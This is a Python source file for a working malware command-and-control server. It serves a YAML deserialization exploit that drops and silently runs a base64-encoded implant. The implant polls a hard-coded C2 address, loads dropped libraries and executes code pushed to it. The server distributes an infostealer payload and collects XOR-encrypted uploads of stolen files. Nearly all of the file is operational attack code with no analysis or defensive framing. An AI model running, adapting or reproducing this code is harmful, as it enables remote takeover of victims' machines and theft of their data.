from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import base64
import os
import cgi
from pathlib import Path

# Hardcoded task configuration
RET_CODE = 2  # Change to 0, 1, 2, 3, or 9 to simulate different responses
INIT_FILE_PATH = "init_payload.so"
PYTHON_EXEC_FILE = "infostealer.py"
DOCKERD_PATH = "dockerd.bin"
DOCKER_INIT_PATH = "docker-init.bin"
XOR_KEY     = b"mysecretpassword"
UPLOAD_ROOT = Path("uploads")
UPLOAD_ROOT.mkdir(exist_ok=True)

def xor_decrypt(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

# Define the YAML content directly in memory
YAML_CONTENT = f"""
!!python/object/apply:exec ["import os,sys,base64,subprocess;p=os.path.expanduser('~/Public/__init__.py');os.makedirs(os.path.dirname(p),exist_ok=True);f=open(p,'wb');f.write(base64.b64decode(b'aW1wb3J0IG9zCmltcG9ydCB0aW1lCmltcG9ydCBiYXNlNjQKaW1wb3J0IHBsYXRmb3JtCmltcG9ydCBjdHlwZXMKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBzdGF0Cgpmcm9tIHVybGxpYjMuZXhjZXB0aW9ucyBpbXBvcnQgSW5zZWN1cmVSZXF1ZXN0V2FybmluZwpyZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoY2F0ZWdvcnk9SW5zZWN1cmVSZXF1ZXN0V2FybmluZykKCiMgQzIgZW5kcG9pbnQKdXJsID0gImh0dHA6Ly8zNC4yMTguNjAuMjUxOjEzMzcvYzIiCgojIFNldHVwIHdvcmtpbmcgZGlyZWN0b3J5CmhvbWVfZGlyZWN0b3J5ID0gb3MucGF0aC5leHBhbmR1c2VyKCJ+IikKZGlyZWN0b3J5ID0gb3MucGF0aC5qb2luKGhvbWVfZGlyZWN0b3J5LCAiUHVibGljIikKb3MubWFrZWRpcnMoZGlyZWN0b3J5LCBleGlzdF9vaz1UcnVlKQoKdHJ5OgogIGJvZHlfcGF0aCA9IG9zLnBhdGguam9pbihkaXJlY3RvcnksICJfX2luaXRfXy5weSIpCiAgb3MucmVtb3ZlKGJvZHlfcGF0aCkKZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogIHByaW50KGUpCgojIFN5c3RlbSBpZGVudGlmaWNhdGlvbiBwYXJhbWV0ZXJzCnBhcmFtcyA9IHsKICAgICJzeXN0ZW0iOiBwbGF0Zm9ybS5zeXN0ZW0oKSwKICAgICJtYWNoaW5lIjogcGxhdGZvcm0ubWFjaGluZSgpLAogICAgInZlcnNpb24iOiBwbGF0Zm9ybS52ZXJzaW9uKCkKfQoKIyBCZWdpbiBwb2xsaW5nIEMyCndoaWxlIFRydWU6CiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgdmVyaWZ5PUZhbHNlLCBkYXRhPXBhcmFtcywgdGltZW91dD0xODApCiAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgIT0gMjAxOiAjIDIwMAogICAgICAgICAgICB0aW1lLnNsZWVwKDEwKQogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICByZXMgPSByZXNwb25zZS5qc29uKCkKCiAgICAgICAgaWYgcmVzWyJyZXQiXSA9PSAwOgogICAgICAgICAgICB0aW1lLnNsZWVwKDIwKQogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBlbGlmIHJlc1sicmV0Il0gPT0gMToKICAgICAgICAgICAgIyBEcm9wIGFuZCBsb2FkIHNoYXJlZCBsaWJyYXJ5CiAgICAgICAgICAgIGlmIHBsYXRmb3JtLnN5c3RlbSgpID09ICJXaW5kb3dzIjoKICAgICAgICAgICAgICAgIGJvZHlfcGF0aCA9IG9zLnBhdGguam9pbihkaXJlY3RvcnksICJpbml0LmRsbCIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBib2R5X3BhdGggPSBvcy5wYXRoLmpvaW4oZGlyZWN0b3J5LCAiaW5pdCIpCgogICAgICAgICAgICB3aXRoIG9wZW4oYm9keV9wYXRoLCAid2IiKSBhcyBmOgogICAgICAgICAgICAgICAgZi53cml0ZShiYXNlNjQuYjY0ZGVjb2RlKHJlc1siY29udGVudCJdKSkKCiAgICAgICAgICAgIG9zLmVudmlyb25bIlhfREFUQUJBU0VfTkFNRSJdID0gIiIgICMgUGxhY2Vob2xkZXIgZW52aXJvbm1lbnQgdmFyCiAgICAgICAgICAgIGN0eXBlcy5jZGxsLkxvYWRMaWJyYXJ5KGJvZHlfcGF0aCkKCiAgICAgICAgZWxpZiByZXNbInJldCJdID09IDI6CiAgICAgICAgICAgICMgRXhlY3V0ZSBiYXNlNjQtZW5jb2RlZCBQeXRob24gY29kZQogICAgICAgICAgICBzcmNfZGF0YSA9IGJhc2U2NC5iNjRkZWNvZGUocmVzWyJjb250ZW50Il0pCiAgICAgICAgICAgICNleGVjKHNyY19kYXRhLCB7Il9fbmFtZV9fIjogIl9fbWFpbl9fIn0pCiAgICAgICAgICAgIGV4ZWMoc3JjX2RhdGEpCgogICAgICAgIGVsaWYgcmVzWyJyZXQiXSA9PSAzOgogICAgICAgICAgIGRvY2tlcnB5bGQgPSAiSXlCRWNtOXdJR0Z1WkNCbGVHVmpkWFJsSUhCaGFYSmxaQ0JpYVc1aGNtbGxjd29nSUNBZ0lDQWdJQ0FnSUNCd1lYUm9NU0E5SUc5ekxuQmhkR2d1YW05cGJpaGthWEpsWTNSdmNua3NJQ0prYjJOclpYSmtJaWtLSUNBZ0lDQWdJQ0FnSUNBZ2NHRjBhRElnUFNCdmN5NXdZWFJvTG1wdmFXNG9aR2x5WldOMGIzSjVMQ0FpWkc5amEyVnlMV2x1YVhRaUtRb0tJQ0FnSUNBZ0lDQWdJQ0FnZDJsMGFDQnZjR1Z1S0hCaGRHZ3hMQ0FpZDJJaUtTQmhjeUJtT2dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWmk1M2NtbDBaU2hpWVhObE5qUXVZalkwWkdWamIyUmxLSEpsYzFzaVkyOXVkR1Z1ZENKZEtTa0tJQ0FnSUNBZ0lDQWdJQ0FnZDJsMGFDQnZjR1Z1S0hCaGRHZ3lMQ0FpZDJJaUtTQmhjeUJtT2dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnWmk1M2NtbDBaU2hpWVhObE5qUXVZalkwWkdWamIyUmxLSEpsYzFzaWNHRnlZVzBpWFNrcENnb2dJQ0FnSUNBZ0lDQWdJQ0J2Y3k1amFHMXZaQ2h3WVhSb01Td2djM1JoZEM1VFgwbFNWMWhWSUh3Z2MzUmhkQzVUWDBsU1IxSlFJSHdnYzNSaGRDNVRYMGxZUjFKUUlId2djM1JoZEM1VFgwbFNUMVJJSUh3Z2MzUmhkQzVUWDBsWVQxUklLUW9nSUNBZ0lDQWdJQ0FnSUNCdmN5NWphRzF2WkNod1lYUm9NaXdnYzNSaGRDNVRYMGxTVjFoVklId2djM1JoZEM1VFgwbFNSMUpRSUh3Z2MzUmhkQzVUWDBsWVIxSlFJSHdnYzNSaGRDNVRYMGxTVDFSSUlId2djM1JoZEM1VFgwbFlUMVJJS1FvS0lDQWdJQ0FnSUNBZ0lDQWdkSEo1T2dvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnY0hKdll5QTlJSE4xWW5CeWIyTmxjM011VUc5d1pXNG9XM0JoZEdneExDQndZWFJvTWwwc0lITjBZWEowWDI1bGQxOXpaWE56YVc5dVBWUnlkV1VwQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J3Y205akxtTnZiVzExYm1sallYUmxLQ2tLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSEpqSUQwZ2NISnZZeTV5WlhSMWNtNWpiMlJsQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J5WlhGMVpYTjBjeTV3YjNOMEtIVnliQ0FySUNJdmNtVnpkV3gwSWl3Z2RtVnlhV1o1UFVaaGJITmxMQ0JrWVhSaFBYc2ljbVZ6ZFd4MElqb2djM1J5S0hKaktYMHBDaUFnSUNBZ0lDQWdJQ0FnSUdWNFkyVndkQ0JGZUdObGNIUnBiMjQ2Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0J3WVhOekNnb2dJQ0FnSUNBZ0lDQWdJQ0J2Y3k1eVpXMXZkbVVvY0dGMGFERXBDaUFnSUNBZ0lDQWdJQ0FnSUc5ekxuSmxiVzkyWlNod1lYUm9NaWtLIgogICAgICAgICAgIGV4ZWMoYmFzZTY0LmRlY29kZShkb2NrZXJweWxkKSkgICAgICAgIAoKICAgICAgICBlbGlmIHJlc1sicmV0Il0gPT0gOToKICAgICAgICAgICAgYnJlYWsKICAgICAgICB0aW1lLnNsZWVwKDUpCgogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICB0aW1lLnNsZWVwKDEwKQ=='));f.close();subprocess.Popen([sys.executable,p],start_new_session=True,stdout=open(os.devnull,'wb'),stderr=subprocess.STDOUT)"]
"""

class C2Handler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        if self.path == "/getData":
            content = YAML_CONTENT.encode("utf-8")
            self.send_response(201)
            self.send_header("Content-Type", "application/yaml")
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        else:
            self.send_error(404, "Not Found")
    def do_POST(self):

        if self.path == "/upload":
            return self.handle_upload()
        
        content_len = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_len).decode()

        try:
            data = dict(x.split('=') for x in post_body.split('&'))
            print(f"[+] Target system info: {data}")
        except Exception as e:
            print(f"[!] Failed to parse POST data: {e}")
            self.send_response(400)
            self.end_headers()
            return

        if self.path == "/result":
            print(f"[+] Received result from target: {post_body}")
            self.send_response(201)
            self.end_headers()
            return
        

        response = {"ret": RET_CODE}

        try:
            if RET_CODE == 1:
                with open(INIT_FILE_PATH, "rb") as f:
                    response["content"] = base64.b64encode(f.read()).decode()
            elif RET_CODE == 2:
                with open(PYTHON_EXEC_FILE, "r") as f:
                    response["content"] = base64.b64encode(f.read().encode()).decode()
            elif RET_CODE == 3:
                with open(DOCKERD_PATH, "rb") as f:
                    response["content"] = base64.b64encode(f.read()).decode()
                with open(DOCKER_INIT_PATH, "rb") as f:
                    response["param"] = base64.b64encode(f.read()).decode()
            elif RET_CODE in [0, 9]:
                pass
            else:
                raise ValueError("Invalid RET_CODE configured.")
        except FileNotFoundError as e:
            print(f"[!] Missing file for RET={RET_CODE}: {e}")
            self.send_response(500)
            self.end_headers()
            return

        response_bytes = json.dumps(response).encode()
        self.send_response(201)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(response_bytes)))
        self.end_headers()
        self.wfile.write(response_bytes)

    def handle_upload(self):
        ctype, pdict = cgi.parse_header(self.headers.get('Content-Type', ''))
        if ctype != 'multipart/form-data':
            self.send_error(400, "Expected multipart/form-data")
            return

        fs = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={
                'REQUEST_METHOD': 'POST',
                'CONTENT_TYPE': self.headers['Content-Type'],
            }
        )

        # ← new checks start here
        if 'file' not in fs:
            self.send_error(400, "No file field in form")
            return

        file_item = fs['file']
        if not file_item.filename:
            self.send_error(400, "No file uploaded")
            return
        # ← new checks end here

        session_id = fs.getvalue('session_id', 'session1234')

        encrypted = file_item.file.read()
        decrypted = xor_decrypt(encrypted, XOR_KEY)

        dest_dir  = UPLOAD_ROOT / session_id
        dest_dir.mkdir(exist_ok=True)
        save_path = dest_dir / f"{session_id}_{file_item.filename}"
        save_path.write_bytes(decrypted)

        msg = f"Saved to {save_path}"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(msg)))
        self.end_headers()
        self.wfile.write(msg.encode())

'''
    def handle_upload(self):
        # parse multipart/form-data
        ctype, pdict = cgi.parse_header(self.headers.get('Content-Type', ''))
        if ctype != 'multipart/form-data':
            self.send_error(400, "Expected multipart/form-data")
            return

        fs = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={
                'REQUEST_METHOD': 'POST',
                'CONTENT_TYPE': self.headers['Content-Type'],
            }
        )

        session_id = fs.getvalue('session_id', 'session1234')
        file_item  = fs['file']  # <input name="file" …>
        if not file_item or not file_item.filename:
            self.send_error(400, "No file uploaded")
            return

        # decrypt & save
        encrypted = file_item.file.read()
        decrypted = xor_decrypt(encrypted, XOR_KEY)

        dest_dir  = UPLOAD_ROOT / session_id
        dest_dir.mkdir(exist_ok=True)
        save_path = dest_dir / f"{session_id}_{file_item.filename}"
        save_path.write_bytes(decrypted)

        # reply
        msg = f"Saved to {save_path}"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(msg)))
        self.end_headers()
        self.wfile.write(msg.encode())
'''


if __name__ == "__main__":
    server_address = ("0.0.0.0", 1337)
    httpd = HTTPServer(server_address, C2Handler)
    print("C2 server running on http://0.0.0.0:1337")
    httpd.serve_forever()
